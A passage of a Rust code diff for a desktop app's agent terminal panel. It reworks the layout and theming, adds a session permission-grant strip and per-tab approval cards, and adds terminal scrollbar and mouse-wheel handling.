-        if state.mention_popup.is_open_for_surface("agents-left-pty") {
-            state.mention_popup.sync_from_composer_text("", 0, doc, current_page);
-            let mut unused_text = String::new();
-            let kb_outcome = state.mention_popup.handle_keyboard(ui.ctx(), &mut unused_text, &mut state.active_mentions, doc, current_page);
-            if let crate::agent_mention_popup::MentionPopupOutcome::PickedTerminal(mention) = kb_outcome {
-                state.handle_terminal_mention_pick(&mention);
-            }
-        }
-
-        // Render bottom composer (`#689` §3 rule 9 & §7) first so its focused `TextEdit` consumes keys
-        // before `render_vt100_viewport` checks keyboard input.
+        let grant_h = paint_session_grants(state, ui, bar_r.bottom(), rect);
+        let content_top = bar_r.bottom() + grant_h;
+        // The composer is painted before the terminal so a focused field consumes keys first.
         let composer_rect = crate::agent_composer::show_composer(
             state,
             ui,
             rect,
-            ctx_r.bottom(),
+            content_top,
             file_path,
             crate::agent_composer::MentionScope { doc, page: current_page },
             &mut actions,
         );
 
-        // Live VT100 PTY Terminal Viewport above the composer; the turn receipt row sits between them (`#683`).
         let active_receipt =
             state.active_tab().filter(|t| !matches!(t.effective_status(), AgentTabStatus::Working(_))).and_then(|t| t.last_turn_receipt().cloned());
-        let receipt_h = if active_receipt.is_some() { 24.0 } else { 0.0 };
-        let vp_bottom = (composer_rect.top() - theme::SPACE_INLINE - receipt_h).max(ctx_r.bottom() + theme::CONTROL_ROW);
-        let vp_r = Rect::from_min_max(Pos2::new(rect.left(), ctx_r.bottom()), Pos2::new(rect.right(), vp_bottom));
+        let receipt_h = if active_receipt.is_some() { TERMINAL_RECEIPT_H } else { 0.0 };
+        let vp_bottom = (composer_rect.top() - theme::SPACE_INLINE - receipt_h).max(content_top + theme::CONTROL_MD);
+        let vp_r = Rect::from_min_max(Pos2::new(rect.left(), content_top), Pos2::new(rect.right(), vp_bottom));
 
         if ui.input(|i| i.pointer.any_pressed()) {
             if let Some(pos) = ui.input(|i| i.pointer.interact_pos()) {
@@ -5354,8 +6602,12 @@ pub fn show_left_with_doc(
             }
         }
 
+        #[cfg(test)]
+        ui.ctx().data_mut(|d| d.insert_temp(Id::new(("test-rect", "agents-terminal-viewport".to_string())), vp_r));
         render_vt100_viewport(state, ui, vp_r, file_path, "agents-left-pty");
-        if !state.viewport_focused && !state.overlay_owns_keyboard && ui.input(|i| i.key_pressed(Key::Escape)) {
+        let chrome_owns_keys =
+            state.runtime_dropdown_open || state.attach_menu_open || state.mode_menu_open || state.sessions_popover_open || state.skills.picker_open;
+        if !state.viewport_focused && !state.overlay_owns_keyboard && !chrome_owns_keys && ui.input(|i| i.key_pressed(Key::Escape)) {
             // egui takes the caret out of the composer on a bare `Esc` before this code runs, so where the caret was a
             // frame ago counts as well: an `Esc` that leaves the composer must not also stop the turn (`#684`, `#923`).
             let composer_focused = state.composer_focused_last_frame || ui.ctx().memory(|m| m.has_focus(Id::new("agents-ask-for-changes-input")));
@@ -5369,18 +6621,10 @@ pub fn show_left_with_doc(
             state.apply_start_fix(fix, file_path);
         }
 
-        if state.mention_popup.is_open_for_surface("agents-left-pty") {
-            let mut unused_text = String::new();
-            let show_outcome = state.mention_popup.show(ui, rect, ctx_r, &mut unused_text, &mut state.active_mentions);
-            if let crate::agent_mention_popup::MentionPopupOutcome::PickedTerminal(mention) = show_outcome {
-                state.handle_terminal_mention_pick(&mention);
-            }
-        }
-
         state.expire_resume_notice();
         // Floating `+` Runtime Selector Dropdown (`claude`, `codex`, `grok`, `antigravity`, `shell` — all skipping dangerous permissions)
         if state.runtime_dropdown_open {
-            render_runtime_dropdown_menu(state, ui, rect, bar_r.bottom() + 4.0, file_path);
+            render_runtime_dropdown_menu(state, ui, rect, bar_r.bottom() + theme::SPACE_ROW, file_path);
         }
         if state.sessions_popover_open {
             crate::agent_open_flow::render_sessions_popover(state, ui, rect, bar_r.bottom() + theme::INSET_SEGMENT, file_path);
@@ -5392,14 +6636,12 @@ pub fn show_left_with_doc(
         return actions;
     }
 
-    let panel_bg = Color32::from_rgb(0x2C, 0x2C, 0x2C);
-    p.rect_filled(rect, 0.0, panel_bg);
+    p.rect_filled(rect, 0.0, theme::BG);
 
-    // ---- A. Top Header Bar (48px, `#2C2C2C` fill, `1px` `#383838` bottom hairline)
     let header_h = 48.0;
     let header_rect = Rect::from_min_size(rect.min, Vec2::new(rect.width(), header_h));
-    p.rect_filled(header_rect, 0.0, panel_bg);
-    widgets::hline(&p, header_rect.left(), header_rect.right(), header_rect.bottom() - 1.0, Color32::from_rgb(0x38, 0x38, 0x38));
+    p.rect_filled(header_rect, 0.0, theme::BG_PRIMARY);
+    widgets::hline(&p, header_rect.left(), header_rect.right(), header_rect.bottom() - theme::BORDER_WIDTH, theme::BORDER);
 
     let back_r = Rect::from_center_size(Pos2::new(header_rect.left() + 18.0, header_rect.top() + 18.0), Vec2::splat(20.0));
     let back_resp = ui.interact(back_r, Id::new("agents-header-back"), Sense::click());
@@ -5407,7 +6649,7 @@ pub fn show_left_with_doc(
         p.rect_filled(back_r, CornerRadius::same(4), TERM_BG_HOVER);
     }
     let bc = back_r.center();
-    let chev_stroke = Stroke::new(1.5, Color32::from_rgb(0xB3, 0xB3, 0xB3));
+    let chev_stroke = Stroke::new(1.5, theme::ICON_TERTIARY);
     p.line_segment([Pos2::new(bc.x + 2.0, bc.y - 4.5), Pos2::new(bc.x - 2.5, bc.y)], chev_stroke);
     p.line_segment([Pos2::new(bc.x - 2.5, bc.y), Pos2::new(bc.x + 2.0, bc.y + 4.5)], chev_stroke);
     widgets::record(ui, "agents-header-back", back_r);
@@ -5416,14 +6658,8 @@ pub fn show_left_with_doc(
         state.chat_mode = false;
     }
 
-    p.text(Pos2::new(header_rect.left() + 34.0, header_rect.top() + 17.0), Align2::LEFT_CENTER, "New chat", theme::font_body_strong(), Color32::WHITE);
-    p.text(
-        Pos2::new(header_rect.left() + 34.0, header_rect.top() + 33.0),
-        Align2::LEFT_CENTER,
-        "Shared",
-        theme::font_caption(),
-        Color32::from_rgb(0x8C, 0x8C, 0x8C),
-    );
+    p.text(Pos2::new(header_rect.left() + 34.0, header_rect.top() + 17.0), Align2::LEFT_CENTER, "New chat", theme::font_body_strong(), theme::TEXT);
+    p.text(Pos2::new(header_rect.left() + 34.0, header_rect.top() + 33.0), Align2::LEFT_CENTER, "Shared", theme::font_caption(), theme::TEXT_SECONDARY);
     if state.needs_approval() {
         let pill_w = widgets::text_width(&p, NEEDS_APPROVAL_LABEL, &theme::font_caption_medium()) + 16.0;
         let pill_r = Rect::from_min_size(Pos2::new(header_rect.left() + 78.0, header_rect.top() + 24.0), Vec2::new(pill_w, 18.0));
@@ -5437,15 +6673,15 @@ pub fn show_left_with_doc(
     let ai_rect = Rect::from_center_size(Pos2::new(header_rect.right() - theme::SPACE_INLINE - 12.0, h_cy), Vec2::new(24.0, 18.0));
     let ai_resp = ui.interact(ai_rect, Id::new("agents-header-ai"), Sense::click());
     let ai_bg = if !state.chat_mode || state.side_panel_pty_open {
-        Color32::from_rgb(0x16, 0x35, 0x52)
+        theme::BG_SELECTED
     } else if ai_resp.hovered() {
         TERM_BG_HOVER
     } else {
-        Color32::from_rgb(0x38, 0x38, 0x38)
+        theme::BG_SECONDARY
     };
     p.rect_filled(ai_rect, CornerRadius::same(4), ai_bg);
-    p.rect_stroke(ai_rect, CornerRadius::same(4), Stroke::new(1.0, Color32::from_rgb(0x4D, 0x4D, 0x4D)), StrokeKind::Inside);
-    p.text(ai_rect.center(), Align2::CENTER_CENTER, "AI", theme::font_caption_strong(), Color32::from_rgb(0xD4, 0xD4, 0xD4));
+    p.rect_stroke(ai_rect, CornerRadius::same(4), Stroke::new(theme::BORDER_WIDTH, theme::BORDER), StrokeKind::Inside);
+    p.text(ai_rect.center(), Align2::CENTER_CENTER, "AI", theme::font_caption_strong(), theme::TEXT_SECONDARY);
     widgets::record(ui, "agents-ai-badge", ai_rect);
     widgets::record(ui, "agents-header-ai", ai_rect);
     if ai_resp.clicked() {
@@ -5458,8 +6694,8 @@ pub fn show_left_with_doc(
     // ---- B2. CLI Runtime Selector Bar (`28px`, `Claude` | `Codex` | `AGY` | `Grok` + `Shell` toggle)
     let rt_bar_h = 28.0;
     let rt_bar_r = Rect::from_min_size(Pos2::new(rect.left(), top_y), Vec2::new(rect.width(), rt_bar_h));
-    p.rect_filled(rt_bar_r, 0.0, Color32::from_rgb(0x22, 0x22, 0x22));
-    widgets::hline(&p, rt_bar_r.left(), rt_bar_r.right(), rt_bar_r.bottom() - 1.0, Color32::from_rgb(0x38, 0x38, 0x38));
+    p.rect_filled(rt_bar_r, 0.0, theme::BG_PRIMARY);
+    widgets::hline(&p, rt_bar_r.left(), rt_bar_r.right(), rt_bar_r.bottom() - theme::BORDER_WIDTH, theme::BORDER);
 
     let rt_pills: [(&str, &str, AgentCliPreset, f32, f32); 4] = [
         ("agents-runtime-claude", "Claude", AgentCliPreset::Claude, 4.0, 46.0),
@@ -5472,14 +6708,14 @@ pub fn show_left_with_doc(
         let p_resp = ui.interact(p_rect, Id::new(pill_id), Sense::click());
         let is_sel = !state.side_panel_pty_open && state.active_runtime == preset;
         let bg = if is_sel {
-            STATUS_INFO_BG
+            theme::BG_SELECTED
         } else if p_resp.hovered() {
             TERM_BG_HOVER
         } else {
-            Color32::from_rgb(0x2C, 0x2C, 0x2C)
+            theme::BG
         };
-        let border = if is_sel { STATUS_INFO_BORDER } else { Color32::from_rgb(0x38, 0x38, 0x38) };
-        let fg = if is_sel { STATUS_INFO_TEXT } else { Color32::from_rgb(0xD4, 0xD4, 0xD4) };
+        let border = if is_sel { theme::BORDER_STRONG } else { theme::BORDER };
+        let fg = if is_sel { theme::TEXT } else { theme::TEXT_SECONDARY };
         p.rect_filled(p_rect, CornerRadius::same(4), bg);
         p.rect_stroke(p_rect, CornerRadius::same(4), Stroke::new(1.0, border), StrokeKind::Inside);
         p.text(p_rect.center(), Align2::CENTER_CENTER, pill_label, theme::font_caption_strong(), fg);
@@ -5494,14 +6730,14 @@ pub fn show_left_with_doc(
     let pty_toggle_resp = ui.interact(pty_toggle_r, Id::new("agents-runtime-pty-toggle"), Sense::click());
     let pty_sel = state.side_panel_pty_open;
     let pty_bg = if pty_sel {
-        STATUS_OK_BG
+        theme::BG_SELECTED
     } else if pty_toggle_resp.hovered() {
         TERM_BG_HOVER
     } else {
-        Color32::from_rgb(0x2C, 0x2C, 0x2C)
+        theme::BG
     };
-    let pty_border = if pty_sel { STATUS_OK_BORDER } else { Color32::from_rgb(0x38, 0x38, 0x38) };
-    let pty_fg = if pty_sel { STATUS_OK_TEXT } else { Color32::from_rgb(0xB3, 0xB3, 0xB3) };
+    let pty_border = if pty_sel { theme::BORDER_STRONG } else { theme::BORDER };
+    let pty_fg = if pty_sel { theme::TEXT } else { theme::TEXT_SECONDARY };
     p.rect_filled(pty_toggle_r, CornerRadius::same(4), pty_bg);
     p.rect_stroke(pty_toggle_r, CornerRadius::same(4), Stroke::new(1.0, pty_border), StrokeKind::Inside);
     p.text(pty_toggle_r.center(), Align2::CENTER_CENTER, "Shell", theme::font_caption_strong(), pty_fg);
@@ -5512,25 +6748,30 @@ pub fn show_left_with_doc(
     top_y = rt_bar_r.bottom();
 
     // ---- D. Bottom Docked Composer Box (`#689` §7)
+    let grant_h = paint_session_grants(state, ui, top_y, rect);
+    top_y += grant_h;
     let composer_rect =
         crate::agent_composer::show_composer(state, ui, rect, top_y, file_path, crate::agent_composer::MentionScope { doc, page: current_page }, &mut actions);
 
     // ---- C. Center Area (`between runtime bar and bottom composer`)
     let full_center_rect = Rect::from_min_max(Pos2::new(rect.left(), top_y), Pos2::new(rect.right(), (composer_rect.top() - 8.0).max(top_y + 32.0)));
-    let active_preset = state.active_tab().map(|t| t.preset).unwrap_or(state.active_runtime);
-    let center_rect = if state.needs_approval() {
-        let reqs = state.pending_approvals.clone();
-        if let Some(act) = crate::agent_approval_card::paint_approval_card(ui, full_center_rect, active_preset, &reqs, "agents-left-chat") {
+    if let Some((target_tab_id, banner_preset, reqs, is_active_tab, total_pending)) = state.approval_banner_target() {
+        let on_active_claude = is_active_tab && banner_preset == AgentCliPreset::Claude;
+        let card_mode = state.tabs.iter().find(|tab| tab.id == target_tab_id).map(|tab| tab.permission_mode).unwrap_or(state.permission_mode);
+        if let Some(act) = crate::agent_approval_card::paint_approval_card_for_tab(
+            ui,
+            full_center_rect,
+            banner_preset,
+            &reqs,
+            target_tab_id,
+            on_active_claude,
+            total_pending,
+            "agents-left-chat",
+            card_mode,
+        ) {
             state.handle_approval_card_action(act);
         }
-        let card_h = crate::agent_approval_card::approval_card_outer_height(active_preset);
-        Rect::from_min_max(Pos2::new(full_center_rect.left(), (full_center_rect.top() + card_h).min(full_center_rect.bottom())), full_center_rect.max)
-    } else {
-        full_center_rect
-    };
-
-    // Empty state: starter prompts, with the `#652` picker on top while no session is open (`#688`).
-    crate::agent_sample_prompts::show_empty_state(state, ui, center_rect, file_path);
+    }
 
     state.skills.show_picker_popover(ui, rect, composer_rect.top());
 
@@ -5539,6 +6780,17 @@ pub fn show_left_with_doc(
 
 fn render_runtime_dropdown_menu(state: &mut TerminalState, ui: &mut Ui, panel_rect: Rect, top_y: f32, file_path: Option<&Path>) {
     crate::agent_picker::render_runtime_dropdown_menu(state, ui, panel_rect, top_y, file_path);
+}
+
+/// Paints the remembered session grants above the composer and returns their height.
+fn paint_session_grants(state: &mut TerminalState, ui: &mut Ui, top: f32, panel: Rect) -> f32 {
+    let now = crate::agent_sessions::unix_timestamp_secs();
+    let grants = state.session_grants.list(&state.session_id, now);
+    let (height, revoke) = crate::agent_approval_card::paint_grant_strip(ui, Pos2::new(panel.left(), top), panel.width(), &grants);
+    if let Some(revoke) = revoke {
+        state.revoke_session_grant(&revoke.tool_name, &revoke.target);
+    }
+    height
 }
 
 /// Renders the one-line "Worked for" receipt row (`#683` §3.4, §5):
@@ -5605,7 +6857,7 @@ fn extract_selected_terminal_text(screen: &vt100::Screen, sel: ((u16, u16), (u16
     strip_selection_gutter(&lines.join("\n"))
 }
 
-fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: Rect, file_path: Option<&Path>, surface_id: &'static str) {
+fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: Rect, _file_path: Option<&Path>, surface_id: &'static str) {
     if let Some(failure) = state.active_tab().and_then(|t| t.start_failure.clone()) {
         if let Some(fix) = agent_start_failure::paint(ui, viewport_rect, &failure, surface_id) {
             state.pending_start_fix = Some(fix);
@@ -5640,45 +6892,58 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
     let p = ui.painter().clone();
     p.rect_filled(viewport_rect, 0.0, TERM_BG_VIEWPORT);
 
-    let active_preset = state.active_tab().map(|t| t.preset).unwrap_or(state.active_runtime);
-    let viewport_rect = if state.needs_approval() {
-        let reqs = state.pending_approvals.clone();
-        if let Some(act) = crate::agent_approval_card::paint_approval_card(ui, viewport_rect, active_preset, &reqs, surface_id) {
+    let mut card_activated = false;
+    let viewport_rect = if let Some((target_tab_id, banner_preset, reqs, is_active_tab, total_pending)) = state.approval_banner_target() {
+        let in_active_terminal = is_active_tab && state.side_panel_pty_open && !state.picker_open;
+        let card_mode = state.tabs.iter().find(|tab| tab.id == target_tab_id).map(|tab| tab.permission_mode).unwrap_or(state.permission_mode);
+        if let Some(act) = crate::agent_approval_card::paint_approval_card_for_tab(
+            ui,
+            viewport_rect,
+            banner_preset,
+            &reqs,
+            target_tab_id,
+            in_active_terminal,
+            total_pending,
+            surface_id,
+            card_mode,
+        ) {
+            card_activated = true;
             state.handle_approval_card_action(act);
+            if let Some(fid) = ui.ctx().memory(|m| m.focused()) {
+                ui.ctx().memory_mut(|m| m.surrender_focus(fid));
+            }
         }
-        let card_h = crate::agent_approval_card::approval_card_outer_height(active_preset);
+        let card_preset = if in_active_terminal && banner_preset == AgentCliPreset::Claude { banner_preset } else { AgentCliPreset::Codex };
+        let has_session_grant = in_active_terminal
+            && banner_preset == AgentCliPreset::Claude
+            && reqs.first().is_some_and(|req| crate::agent_permissions::offer_session_grant(card_mode, req));
+        let card_h = crate::agent_approval_card::approval_card_outer_height_for_width(card_preset, viewport_rect.width(), has_session_grant);
         Rect::from_min_max(Pos2::new(viewport_rect.left(), (viewport_rect.top() + card_h).min(viewport_rect.bottom())), viewport_rect.max)
     } else {
         viewport_rect
     };
-    if state.picker_open || state.tabs.is_empty() {
-        if !state.runtime_dropdown_open && !state.sessions_popover_open {
-            if state.tabs.is_empty() {
-                // Agents panel with no session yet: the picker stays on top and the starter prompts sit below it
-                // (`#688` §3 rule 3).
-                crate::agent_sample_prompts::show_empty_state(state, ui, viewport_rect, file_path);
-            } else {
-                crate::agent_picker::show_picker_panel(state, ui, viewport_rect, file_path);
-            }
-        }
-        return;
-    }
-
     let pad_x = 12.0;
     let pad_y = 8.0;
     let origin_x = viewport_rect.left() + pad_x;
     let origin_y = viewport_rect.top() + pad_y;
-    let grid_w = (viewport_rect.width() - pad_x * 2.0).max(120.0);
-    let grid_h = (viewport_rect.height() - pad_y * 2.0).max(32.0);
-    let cols = ((grid_w / CHAR_W).floor() as u16).clamp(20, 320);
-    let rows = ((grid_h / ROW_H).floor() as u16).clamp(4, 120);
+    let grid_w = (viewport_rect.width() - pad_x * 2.0).max(CHAR_W * f32::from(TERM_MIN_COLS));
+    let grid_h = (viewport_rect.height() - pad_y * 2.0).max(ROW_H * f32::from(TERM_MIN_ROWS));
+    let cols = ((grid_w / CHAR_W).floor() as u16).clamp(TERM_MIN_COLS, TERM_MAX_COLS);
+    let rows = ((grid_h / ROW_H).floor() as u16).clamp(TERM_MIN_ROWS, TERM_MAX_ROWS);
+    state.viewport_size = (rows, cols);
+
+    if state.picker_open || state.tabs.is_empty() {
+        return;
+    }
 
     let vp_resp = ui.interact(viewport_rect, Id::new((surface_id, "term-vt100-viewport")), Sense::click_and_drag());
     if vp_resp.clicked() || vp_resp.drag_started() {
         state.viewport_focused = true;
     }
     // An open dialog or menu owns the keys: the terminal neither sends them to the agent nor shows its caret as active.
-    let viewport_focused = state.viewport_focused && !state.mention_popup.is_open() && !state.overlay_owns_keyboard;
+    let chrome_owns_keys =
+        state.runtime_dropdown_open || state.attach_menu_open || state.mode_menu_open || state.sessions_popover_open || state.skills.picker_open;
+    let viewport_focused = state.viewport_focused && !state.mention_popup.is_open() && !state.overlay_owns_keyboard && !chrome_owns_keys;
     let search_open = state.search_open;
     let search_query = state.search_query.clone();
     let search_case_sensitive = state.search_case_sensitive;
@@ -5696,57 +6961,116 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
     let mut search_matches = 0usize;
 
     if let Some(tab) = state.active_tab_mut() {
-        tab.resize(rows, cols);
+        let now_s = ui.input(|i| i.time);
+        if tab.request_resize(rows, cols, now_s) {
+            ui.ctx().request_repaint_after(std::time::Duration::from_secs_f64(RESIZE_DEBOUNCE_SECS));
+        }
+
+        let scrollback_len = tab.parser.lock().ok().map(|mut pg| parser_scrollback_len(&mut pg)).unwrap_or(0);
+        let track_rect = Rect::from_min_size(
+            Pos2::new(viewport_rect.right() - theme::TARGET_MIN, viewport_rect.top()),
+            Vec2::new(theme::TARGET_MIN, viewport_rect.height()),
+        );
+        let mut press_in_scrollbar = false;
+        let mut sb_active = false;
+        if scrollback_len > 0 && viewport_rect.height() > 0.0 {
+            let sb_resp = ui.interact(track_rect, Id::new((surface_id, "term-scrollbar")), Sense::click_and_drag());
+            press_in_scrollbar = sb_resp.clicked()
+                || sb_resp.dragged()
+                || sb_resp.is_pointer_button_down_on()
+                || ui.input(|i| {
+                    i.pointer.press_origin().is_some_and(|p| track_rect.contains(p))
+                        || i.events.iter().any(|ev| {
+                            matches!(ev, Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: true, .. } if track_rect.contains(*pos))
+                        })
+                });
+            sb_active = sb_resp.hovered() || sb_resp.dragged() || press_in_scrollbar;
+            if press_in_scrollbar {
+                let pointer_y = ui.input(|i| {
+                    i.pointer.interact_pos().map(|p| p.y).or_else(|| {
+                        i.events.iter().rev().find_map(|ev| match ev {
+                            Event::PointerButton { pos, button: egui::PointerButton::Primary, .. } | Event::PointerMoved(pos) => Some(pos.y),
+                            _ => None,
+                        })
+                    })
+                });
+                if let Some(py) = pointer_y {
+                    let track_len = track_rect.height();
+                    let total_lines = (scrollback_len + usize::from(rows)).max(1);
+                    let ratio = (f32::from(rows) / total_lines as f32).clamp(0.0, 1.0);
+                    let max_thumb = (track_len * 0.5).max(theme::SPACE_FACT);
+                    let min_thumb = theme::TARGET_MIN.min(max_thumb);
+                    let thumb_h = (track_len * ratio).clamp(min_thumb, max_thumb);
+                    let denom = (track_len - thumb_h).max(1.0);
+                    let from_top = ((py - track_rect.top() - thumb_h * 0.5) / denom).clamp(0.0, 1.0);
+                    let new_frac = 1.0 - from_top;
+                    let new_offset = (new_frac * scrollback_len as f32).round() as usize;
+                    tab.restore_scrollback.store(0, std::sync::atomic::Ordering::Release);
+                    if let Ok(mut pg) = tab.parser.lock() {
+                        pg.set_scrollback(new_offset);
+                    }
+                }
+            }
+        }
 
         // Pointer click & drag cell selection
-        if vp_resp.clicked() && !vp_resp.dragged() {
-            tab.selection = None;
-        }
-        if vp_resp.drag_started() {
-            if let Some(pos) = ui.input(|i| i.pointer.press_origin().or_else(|| i.pointer.interact_pos())) {
-                let cell = pos_to_cell(pos);
-                tab.selection = Some((cell, cell));
+        if !press_in_scrollbar {
+            if vp_resp.clicked() && !vp_resp.dragged() {
+                tab.selection = None;
             }
-        }
-        if vp_resp.dragged() {
-            if let Some(pos) = ui.input(|i| i.pointer.interact_pos()) {
-                let cur = pos_to_cell(pos);
-                let start = tab.selection.map(|(s, _)| s).unwrap_or(cur);
-                tab.selection = Some((start, cur));
+            if vp_resp.drag_started() {
+                if let Some(pos) = ui.input(|i| i.pointer.press_origin().or_else(|| i.pointer.interact_pos())) {
+                    let cell = pos_to_cell(pos);
+                    tab.selection = Some((cell, cell));
+                }
+            }
+            if vp_resp.dragged() {
+                if let Some(pos) = ui.input(|i| i.pointer.interact_pos()) {
+                    let cur = pos_to_cell(pos);
+                    let start = tab.selection.map(|(s, _)| s).unwrap_or(cur);
+                    tab.selection = Some((start, cur));
+                }
             }
         }
 
-        // Mouse wheel: SGR mouse wheel in alternate screen (`?1049h`) when mouse reporting is active, else 5,000-line scrollback
+        // Mouse wheel: main screen always scrolls Studio's 5,000-line scrollback; alternate screen (`?1049h`)
+        // forwards mouse wheel reports in the active mouse encoding or cursor keys when mouse reporting is off.
         if vp_resp.hovered() {
-            let delta_y = ui.input(|i| i.smooth_scroll_delta.y);
-            if delta_y.abs() > 0.5 {
-                let (alt_screen, mouse_active) = tab
-                    .parser
-                    .lock()
-                    .ok()
-                    .map(|pg| (pg.screen().alternate_screen(), pg.screen().mouse_protocol_mode() != vt100::MouseProtocolMode::None))
-                    .unwrap_or((false, false));
-                if alt_screen && mouse_active && !ui.input(|i| i.modifiers.shift) {
-                    let (r0, c0) = ui.input(|i| i.pointer.hover_pos()).map(&pos_to_cell).unwrap_or((0, 0));
-                    let button = if delta_y > 0.0 { 64 } else { 65 };
-                    let seq = format!("\x1b[<{button};{};{}M", c0 + 1, r0 + 1);
-                    tab.write_bytes(seq.as_bytes());
-                } else if let Ok(mut pg) = tab.parser.lock() {
-                    let step = ((delta_y.abs() / ROW_H).ceil() as usize).max(1);
-                    let cur_sb = pg.screen().scrollback();
-                    let next_sb = if delta_y > 0.0 { cur_sb.saturating_add(step) } else { cur_sb.saturating_sub(step) };
-                    pg.set_scrollback(next_sb);
+            let delta_rows = wheel_delta_rows(ui.input(|i| i.smooth_scroll_delta.y));
+            if delta_rows != 0 {
+                let cell = ui.input(|i| i.pointer.hover_pos()).map(&pos_to_cell).unwrap_or((0, 0));
+                let shift = ui.input(|i| i.modifiers.shift);
+                let action = if let Ok(mut pg) = tab.parser.lock() {
+                    let act = wheel_bytes(pg.screen(), delta_rows, cell, shift);
+                    if let WheelAction::Scrollback(rows_delta) = act {
+                        tab.restore_scrollback.store(0, std::sync::atomic::Ordering::Release);
+                        let step = rows_delta.unsigned_abs();
+                        let cur_sb = pg.screen().scrollback();
+                        let next_sb = if rows_delta > 0 { cur_sb.saturating_add(step) } else { cur_sb.saturating_sub(step) };
+                        pg.set_scrollback(next_sb);
+                    }
+                    act
+                } else {
+                    WheelAction::Noop
+                };
+                if let WheelAction::WritePty(bytes) = action {
+                    tab.write_bytes(&bytes);
                 }
             }
         }
 
         // Direct raw keystroke, Agent CLI shortcuts & bracketed paste capture when the terminal viewport is focused
         if viewport_focused
+            && !card_activated
             && (!crate::agent_a11y::non_canvas_has_focus(ui.ctx())
                 || ui.ctx().memory(|m| m.has_focus(vp_resp.id) || m.has_focus(crate::agent_a11y::composer_id())))
         {
             let bracketed_paste = tab.parser.lock().ok().map(|pg| pg.screen().bracketed_paste()).unwrap_or(false);
             let mut raw_bytes: Vec<u8> = Vec::new();
+            // Set when a key that can answer Gemini CLI's confirmation dialog is among them: Enter, Esc, Ctrl+C or an option number
+            // (`ToolConfirmationMessage.tsx:185-196`, `useSelectionList.ts:411-461`, `AppContainer.tsx:1695-1701` in 0.35.3). It never
+            // ends a wait; the dialog on screen does (`gemini_dialog`).
+            let mut answers_gemini_dialog = false;
             let mut copy_selection = false;
             let mut select_all = false;
             let mut clear_scrollback = false;
@@ -5767,6 +7091,7 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
                             if !i.modifiers.command && !i.modifiers.ctrl && !i.modifiers.alt && text != "\n" && text != "\r" {
                                 tab.input_line_buffer.push_str(text);
                                 raw_bytes.extend_from_slice(text.as_bytes());
+                                answers_gemini_dialog |= matches!(text.as_bytes(), [b'1'..=b'5']);
                             }
                         }
                         Event::Key { key, pressed: true, modifiers, .. } => {
@@ -5809,6 +7134,7 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
                                         } else {
                                             tab.input_line_buffer.clear();
                                             raw_bytes.push(0x03);
+                                            answers_gemini_dialog = true;
                                         }
                                     }
                                     Key::D => raw_bytes.push(0x04),
@@ -5837,6 +7163,7 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
                                         tab.input_line_buffer.clear();
                                         tab.clear_session_failure();
                                         raw_bytes.push(b'\r');
+                                        answers_gemini_dialog = true;
                                     }
                                     Key::Backspace => {
                                         let _ = tab.input_line_buffer.pop();
@@ -5848,6 +7175,7 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
                                             close_search = true;
                                         } else {
                                             raw_bytes.push(0x1b);
+                                            answers_gemini_dialog = true;
                                         }
                                     }
                                     Key::ArrowUp => raw_bytes.extend_from_slice(b"\x1b[A"),
@@ -5870,14 +7198,15 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
                 tab.selection = Some(((0, 0), (rows.saturating_sub(1), cols.saturating_sub(1))));
             }
             if clear_scrollback {
+                tab.restore_scrollback.store(0, std::sync::atomic::Ordering::Release);
                 if let Ok(mut pg) = tab.parser.lock() {
                     pg.set_scrollback(0);
                 }
             }
             if copy_selection {
                 if let Some(sel) = tab.selection.take() {
-                    if let Ok(pg) = tab.parser.lock() {
-                        let copied = extract_selected_terminal_text(pg.screen(), sel, rows, cols);
+                    if let Ok(mut pg) = tab.parser.lock() {
+                        let copied = with_scrollback_safe_screen(&mut pg, |screen| extract_selected_terminal_text(screen, sel, rows, cols));
                         if !copied.is_empty() {
                             ui.ctx().copy_text(copied);
                         }
@@ -5885,10 +7214,14 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
                 }
             }
             if !raw_bytes.is_empty() {
+                tab.restore_scrollback.store(0, std::sync::atomic::Ordering::Release);
                 if let Ok(mut pg) = tab.parser.lock() {
                     pg.set_scrollback(0);
                 }
                 tab.write_bytes(&raw_bytes);
+                if answers_gemini_dialog {
+                    tab.note_gemini_key();
+                }
             }
         }
 
@@ -5896,191 +7229,202 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
 
         clipped(ui, viewport_rect, |ui| {
             let p = ui.painter().clone();
-            let Ok(parser) = tab.parser.lock() else {
+            let Ok(mut parser) = tab.parser.lock() else {
                 return;
             };
-            let screen = parser.screen();
-            let scrollback_offset = screen.scrollback();
-            let (cur_row, cur_col) = screen.cursor_position();
-            let font_id = FontId::new(11.5, FontFamily::Monospace);
+            with_scrollback_safe_screen(&mut parser, |screen| {
+                let scrollback_offset = screen.scrollback();
+                let (cur_row, cur_col) = screen.cursor_position();
+                let font_id = FontId::new(11.5, FontFamily::Monospace);
 
-            let needle = if search_open && !search_query.is_empty() {
-                Some(if search_case_sensitive { search_query.clone() } else { search_query.to_ascii_lowercase() })
-            } else {
-                None
-            };
+                let needle = if search_open && !search_query.is_empty() {
+                    Some(if search_case_sensitive { search_query.clone() } else { search_query.to_ascii_lowercase() })
+                } else {
+                    None
+                };
 
-            for r in 0..rows {
-                let row_y = origin_y + r as f32 * ROW_H;
-                if row_y + ROW_H < viewport_rect.top() || row_y > viewport_rect.bottom() {
-                    continue;
-                }
+                for r in 0..rows {
+                    let row_y = origin_y + r as f32 * ROW_H;
+                    if row_y + ROW_H < viewport_rect.top() || row_y > viewport_rect.bottom() {
+                        continue;
+                    }
 
-                // Compute search match columns for row `r` when `Cmd+F` search is active
-                let mut row_search_hit = vec![false; cols as usize];
-                if let Some(ref q) = needle {
-                    let mut row_chars: Vec<char> = Vec::with_capacity(cols as usize);
+                    // Compute search match columns for row `r` when `Cmd+F` search is active
